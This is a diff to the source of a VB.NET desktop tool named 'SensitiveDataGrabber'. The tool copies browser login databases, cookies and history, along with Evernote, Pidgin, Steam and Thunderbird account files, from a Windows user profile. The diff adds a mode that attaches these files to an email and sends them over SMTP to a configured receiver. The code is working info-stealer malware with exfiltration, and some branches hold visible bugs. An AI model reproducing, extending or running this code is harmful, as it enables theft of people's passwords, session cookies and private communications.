@@ -7,6 +7,13 @@ Imports Microsoft.VisualBasic.FileIO
 
 Public Class MainForm
 
+    ' basic variables
+    Dim method As String
+    Dim driveLetter As String
+    Dim defaultBrowser As String
+    Dim username As String = Environment.UserName
+    Dim softwareName As String
+
     ' email variables
     Dim emailCredentials As New emailCredentials
     Dim emailSMTPServer As String
@@ -15,14 +22,11 @@ Public Class MainForm
     Dim emailSenderPassword As String
     Dim emailReciever As String
     Dim emailDefaultSubject As String
+    Dim mail As New MailMessage()
 
-    Dim driveLetter As String
-    Dim defaultBrowser As String
-    Dim username As String = Environment.UserName
-
+    ' directories
     Dim firefoxDirectory As String = "C:\Users\" & username & "\AppData\Roaming\Mozilla\Firefox\Profiles\"
     Dim thunderbirdDirectory As String = "C:\Users\" & username & "\AppData\Roaming\Thunderbird\Profiles\"
-    Dim softwareName As String
     Dim chromeDirectory As String = "C:\Users\" & username & "\AppData\Local\Google\Chrome\User Data\Default"
     Dim evernoteDirectory As String = "C:\Users\" & username & "\AppData\Local\Evernote\Evernote\Databases"
     Dim pidginDirectory As String = "C:\Users\" & username & "\AppData\Roaming\.purple\"
@@ -117,64 +121,151 @@ Public Class MainForm
     End Function
 
     Private Function getChrome()
-        If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Chrome") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Chrome")
-        File.Copy(chromeDirectory & "\Bookmarks", driveLetter & "SensitiveDataGrabber\Chrome\bookmarks.txt", True)
-        File.Copy(chromeDirectory & "\Cookies", driveLetter & "SensitiveDataGrabber\Chrome\cookies.sqlite", True)
-        File.Copy(chromeDirectory & "\History", driveLetter & "SensitiveDataGrabber\Chrome\history.sqlite", True)
-        File.Copy(chromeDirectory & "\Login Data", driveLetter & "SensitiveDataGrabber\Chrome\loginData.sqlite", True)
-        File.Copy(chromeDirectory & "\Web Data", driveLetter & "SensitiveDataGrabber\Chrome\webdata.sqlite", True)
+
+        If method = "1" Then
+            MessageBox.Show("test3")
+            If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Chrome") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Chrome")
+            File.Copy(chromeDirectory & "\Bookmarks", driveLetter & "SensitiveDataGrabber\Chrome\bookmarks.txt", True)
+            File.Copy(chromeDirectory & "\Cookies", driveLetter & "SensitiveDataGrabber\Chrome\cookies.sqlite", True)
+            File.Copy(chromeDirectory & "\History", driveLetter & "SensitiveDataGrabber\Chrome\history.sqlite", True)
+            File.Copy(chromeDirectory & "\Login Data", driveLetter & "SensitiveDataGrabber\Chrome\loginData.sqlite", True)
+            File.Copy(chromeDirectory & "\Web Data", driveLetter & "SensitiveDataGrabber\Chrome\webdata.sqlite", True)
+
+        ElseIf method = "2" Then
+            MessageBox.Show("test")
+            Dim chromeBookmarks As Attachment = New Attachment(chromeDirectory & "\Bookmarks")
+            Dim chromeCookies As Attachment = New Attachment(chromeDirectory & "\Cookies")
+            Dim chromeHistory As Attachment = New Attachment(chromeDirectory & "\History")
+            Dim chromeLoginData As Attachment = New Attachment(chromeDirectory & "\Login Data")
+            Dim chromeWebData As Attachment = New Attachment(chromeDirectory & "\Web Data")
+
+            mail.Attachments.Add(chromeBookmarks)
+            mail.Attachments.Add(chromeCookies)
+            mail.Attachments.Add(chromeHistory)
+            mail.Attachments.Add(chromeLoginData)
+            mail.Attachments.Add(chromeWebData)
+
+        Else
+            MessageBox.Show("test2")
+        End If
+
         Return Nothing
     End Function
 
     Private Function getEvernote()
-        If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Evernote") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Evernote")
-        File.Copy(evernoteDirectory & "\.accounts", driveLetter & "SensitiveDataGrabber\Evernote\accountinfo.txt", True)
-        ' Trebaće mi korisničko ime.
-        ' Korisničko ime se nalazi unutar .accounts fajla.
-        ' Završava se sa znakom ;
+        If method = "1" Then
+            If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Evernote") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Evernote")
+            File.Copy(evernoteDirectory & "\.accounts", driveLetter & "SensitiveDataGrabber\Evernote\accountinfo.txt", True)
+            ' Trebaće mi korisničko ime.
+            ' Korisničko ime se nalazi unutar .accounts fajla.
+            ' Završava se sa znakom ;
+
+        ElseIf method = "2" Then
+            Dim evernoteAccounts As Attachment = New Attachment(evernoteDirectory & "\.accounts", "text/plain")
+            mail.Attachments.Add(evernoteAccounts)
+        Else
+
+        End If
+
         Return Nothing
     End Function
 
     Private Function getFirefox()
-        If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Firefox") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Firefox")
-        File.Copy(firefoxDirectory & "cookies.sqlite", driveLetter & "SensitiveDataGrabber\Firefox\cookies.sqlite", True)
-        File.Copy(firefoxDirectory & "addons.json", driveLetter & "SensitiveDataGrabber\Firefox\addons.txt", True)
-        'File.Copy(firefoxDirectory & "downloads.json", driveLetter & "SensitiveDataGrabber\Firefox\downloads.txt", True)
-        File.Copy(firefoxDirectory & "formhistory.sqlite", driveLetter & "SensitiveDataGrabber\Firefox\formhistory.sqlite", True)
+
+        If method = "1" Then
+            If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Firefox") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Firefox")
+            File.Copy(firefoxDirectory & "cookies.sqlite", driveLetter & "SensitiveDataGrabber\Firefox\cookies.sqlite", True)
+            File.Copy(firefoxDirectory & "addons.json", driveLetter & "SensitiveDataGrabber\Firefox\addons.txt", True)
+            'File.Copy(firefoxDirectory & "downloads.json", driveLetter & "SensitiveDataGrabber\Firefox\downloads.txt", True)
+            File.Copy(firefoxDirectory & "formhistory.sqlite", driveLetter & "SensitiveDataGrabber\Firefox\formhistory.sqlite", True)
+        ElseIf method = "2" Then
+            Dim firefoxCookies As Attachment = New Attachment(firefoxDirectory & "cookies.sqlite")
+            Dim firefoxAddons As Attachment = New Attachment(firefoxDirectory & "addons.json")
+            'Dim firefoxDownloads As Attachment = New Attachment(firefoxDirectory & "downloads.json")
+            Dim firefoxFormHistory As Attachment = New Attachment(firefoxDirectory & "formhistory.sqlite")
+
+            mail.Attachments.Add(firefoxCookies)
+            mail.Attachments.Add(firefoxAddons)
+            'mail.Attachments.Add(firefoxDownloads)
+            mail.Attachments.Add(firefoxFormHistory)
+        Else
+
+        End If
+
+        ' Trebaće implementovati if exists za datoteke jer ne postoje ukoliko nema podataka u njima.
         Return Nothing
+
     End Function
 
     Private Function getPidgin()
-        If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Pidgin") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Pidgin")
-        File.Copy(pidginDirectory & "accounts.xml", driveLetter & "SensitiveDataGrabber\Pidgin\accounts.xml", True)
-        My.Computer.FileSystem.CopyDirectory(pidginDirectory & "logs", driveLetter & "SensitiveDataGrabber\Pidgin\logs")
+        If method = "1" Then
+            If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Pidgin") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Pidgin")
+            File.Copy(pidginDirectory & "accounts.xml", driveLetter & "SensitiveDataGrabber\Pidgin\accounts.xml", True)
+            My.Computer.FileSystem.CopyDirectory(pidginDirectory & "logs", driveLetter & "SensitiveDataGrabber\Pidgin\logs")
+        ElseIf method = "2" Then
+            Dim pidginAccounts As Attachment = New Attachment(pidginDirectory & "accounts.xml")
+            mail.Attachments.Add(pidginAccounts)
+        Else
+
+        End If
         Return Nothing
     End Function
 
     Private Function getOneNote()
-        If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\OneNote") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\OneNote")
-        My.Computer.FileSystem.CopyDirectory(oneNoteDirectory, driveLetter & "SensitiveDataGrabber\OneNote\", True)
+        If method = "1" Then
+            If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\OneNote") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\OneNote")
+            My.Computer.FileSystem.CopyDirectory(oneNoteDirectory, driveLetter & "SensitiveDataGrabber\OneNote\", True)
+        ElseIf method = "2" Then
+
+        Else
+
+        End If
         Return Nothing
     End Function
 
     Private Function getSteam()
-        If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Steam") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Steam")
-        File.Copy(steamDirectory & "config.vdf", driveLetter & "SensitiveDataGrabber\Steam\config.txt", True)
+        If method = "1" Then
+            If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Steam") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Steam")
+            File.Copy(steamDirectory & "config.vdf", driveLetter & "SensitiveDataGrabber\Steam\config.txt", True)
+        ElseIf method = "2" Then
+            Dim steamConfig As Attachment = New Attachment(steamDirectory & "config.vdf")
+            mail.Attachments.Add(steamConfig)
+        Else
+
+        End If
         Return Nothing
     End Function
 
     Private Function getThunderbird()
-        If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Thunderbird") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Thunderbird")
-        File.Copy(thunderbirdDirectory & "abook.mab", driveLetter & "SensitiveDataGrabber\Thunderbird\addressbook.mab", True)
-        File.Copy(thunderbirdDirectory & "addons.sqlite", driveLetter & "SensitiveDataGrabber\Thunderbird\addons.sqlite", True)
-        File.Copy(thunderbirdDirectory & "cookies.sqlite", driveLetter & "SensitiveDataGrabber\Thunderbird\cookies.sqlite", True)
+        If method = "1" Then
+            If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\Thunderbird") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\Thunderbird")
+            File.Copy(thunderbirdDirectory & "abook.mab", driveLetter & "SensitiveDataGrabber\Thunderbird\addressbook.mab", True)
+            File.Copy(thunderbirdDirectory & "addons.sqlite", driveLetter & "SensitiveDataGrabber\Thunderbird\addons.sqlite", True)
+            File.Copy(thunderbirdDirectory & "cookies.sqlite", driveLetter & "SensitiveDataGrabber\Thunderbird\cookies.sqlite", True)
+        ElseIf method = "2" Then
+            Dim thunderbirdAddressBook As Attachment = New Attachment(thunderbirdDirectory & "abook.mab")
+            Dim thunderbirdAddons As Attachment = New Attachment(thunderbirdDirectory & "addons.sqlite")
+            Dim thunderbirdCookies As Attachment = New Attachment(thunderbirdDirectory & "cookies.sqlite")
+            mail.Attachments.Add(thunderbirdAddressBook)
+            mail.Attachments.Add(thunderbirdAddons)
+            mail.Attachments.Add(thunderbirdCookies)
+        Else
+
+        End If
         Return Nothing
     End Function
 
     Private Function getWoT()
-        If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\WoT") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\WoT")
-        File.Copy(WoTDirectory & "\preferences.xml", driveLetter & "SensitiveDataGrabber\WoT\preferences.xml", True)
-        My.Computer.FileSystem.CopyDirectory(WoTDirectory & "\battle_results", driveLetter & "SensitiveDataGrabber\WoT\battle_results", True)
+        If method = "1" Then
+            If Not Directory.Exists(driveLetter & "SensitiveDataGrabber\WoT") Then Directory.CreateDirectory(driveLetter & "SensitiveDataGrabber\WoT")
+            File.Copy(WoTDirectory & "\preferences.xml", driveLetter & "SensitiveDataGrabber\WoT\preferences.xml", True)
+            My.Computer.FileSystem.CopyDirectory(WoTDirectory & "\battle_results", driveLetter & "SensitiveDataGrabber\WoT\battle_results", True)
+        ElseIf method = "2" Then
+            Dim wotPreferences As Attachment = New Attachment(WoTDirectory & "\preferences.xml")
+            mail.Attachments.Add(wotPreferences)
+        Else
+
+        End If
         ' Nema osjetljivih podataka unutar World of Tanks foldera.
         ' Iz preferences se može izvući korisničko ime.
         ' Pored toga, mislim da nema ništa bitno u folderu osim rezultata bitaka.
@@ -213,14 +304,12 @@ Public Class MainForm
     Private Function sendMail()
         Try
             Dim Smtp_Server As New SmtpClient
-            Dim mail As New MailMessage()
             Smtp_Server.UseDefaultCredentials = False
             Smtp_Server.Credentials = New Net.NetworkCredential(emailSenderEmail, emailSenderPassword)
             Smtp_Server.Host = emailSMTPServer
             Smtp_Server.Port = emailSMTPPort
             Smtp_Server.EnableSsl = True
 
-            mail = New MailMessage()
             mail.From = New MailAddress(emailSenderEmail)
             mail.To.Add(emailReciever)
             mail.Subject = emailDefaultSubject
@@ -253,6 +342,7 @@ Public Class MainForm
     Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
 
         If RadioButton1.Checked = True Then
+            method = "1"
             If chkFirefox.Checked = True Then
                 firefoxDirectory = getFirefoxDirectory()
                 getFirefox()
@@ -303,8 +393,11 @@ Public Class MainForm
             End If
 
         ElseIf RadioButton2.Checked = True Then
+            method = "2"
             MessageBox.Show(emailSMTPServer & vbCrLf & emailSMTPPort & vbCrLf & emailSenderEmail & vbCrLf &
                          emailSenderPassword & vbCrLf & emailReciever & vbCrLf & emailDefaultSubject)
+            getChrome()
+
             sendMail()
         ElseIf RadioButton3.Checked = True Then
 
@@ -313,26 +406,41 @@ Public Class MainForm
         End If
 
 
-        
-      
-    End Sub
 
-    ' ============================================================================================
-    ' ================ URADITI ================ URADITI =============== URADITI ==================
-    ' ============================================================================================
-    ' ======= Ispraviti tako da prepoznava da li je instaliran program koristeći registar. =======
-    ' ======= Testirati program u virtuelnoj mašini.                                       =======
-    ' ============================================================================================
-    ' ============================================================================================
+
+    End Sub
 
     Private Sub ChangeEmailCredentialsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ChangeEmailCredentialsToolStripMenuItem.Click
         emailCredentials.ShowDialog()
 
         If emailCredentials.DialogResult = Windows.Forms.DialogResult.OK Then
 
-            If emailCredentials.TextBox1.Text <> Nothing Then emailSMTPServer = emailCredentials.TextBox1.Text
-            If emailCredentials.TextBox2.Text <> Nothing Then emailSMTPPort = emailCredentials.TextBox2.Text
-            If emailCredentials.TextBox3.Text <> Nothing Then emailSenderEmail = emailCredentials.TextBox3.Text
+            If emailCredentials.TextBox3.Text <> Nothing Then
+                If emailCredentials.ComboBox1.SelectedItem.ToString = "outlook.com" Then
+                    emailSMTPServer = "smtp-mail.outlook.com"
+                    emailSMTPPort = 587
+                    emailSenderEmail = emailCredentials.TextBox3.Text & "@outlook.com"
+                ElseIf emailCredentials.ComboBox1.SelectedItem.ToString = "hotmail.com" Then
+                    emailSMTPServer = "smtp-mail.outlook.com"
+                    emailSMTPPort = 587
+                    emailSenderEmail = emailCredentials.TextBox3.Text & "@hotmail.com"
+                ElseIf emailCredentials.ComboBox1.SelectedItem.ToString = "live.com" Then
+                    emailSMTPServer = "smtp-mail.outlook.com"
+                    emailSMTPPort = 587
+                    emailSenderEmail = emailCredentials.TextBox3.Text & "@live.com"
+                ElseIf emailCredentials.ComboBox1.SelectedItem.ToString = "gmail.com" Then
+                    emailSMTPServer = "smtp.googlemail.com"
+                    emailSMTPPort = 465
+                ElseIf emailCredentials.ComboBox1.SelectedItem.ToString = "mail.ru" Then
+                    emailSMTPServer = "smtp.mail.ru"
+                    emailSMTPServer = 465
+                    emailSenderEmail = emailCredentials.TextBox3.Text & "@mail.ru"
+                ElseIf emailCredentials.ComboBox1.SelectedItem.ToString = "Other" Then
+                    emailSMTPServer = emailCredentials.TextBox1.Text
+                    emailSMTPServer = emailCredentials.TextBox2.Text
+                End If
+            End If
+
             If emailCredentials.TextBox4.Text <> Nothing Then emailSenderPassword = emailCredentials.TextBox4.Text
             If emailCredentials.TextBox5.Text <> Nothing Then emailReciever = emailCredentials.TextBox5.Text
             If emailCredentials.TextBox6.Text <> Nothing Then emailDefaultSubject = emailCredentials.TextBox6.Text
@@ -346,5 +454,14 @@ Public Class MainForm
 
     End Sub
 
+    ' ============================================================================================
+    ' ================ URADITI ================ URADITI =============== URADITI ==================
+    ' ============================================================================================
+    ' ======= emailCredentials pod other će morati da ide nova forma.                      =======
+    ' ======= Provjeravaj da li je program instaliran iz registra, ne iz explorera.        =======
+    ' ======= Testirati program u virtuelnoj mašini.                                       =======
+    ' ======= Trebace smisliti rjesenje za slanje foldera kao attachment.                  =======
+    ' ============================================================================================
+    ' ============================================================================================
 
 End Class
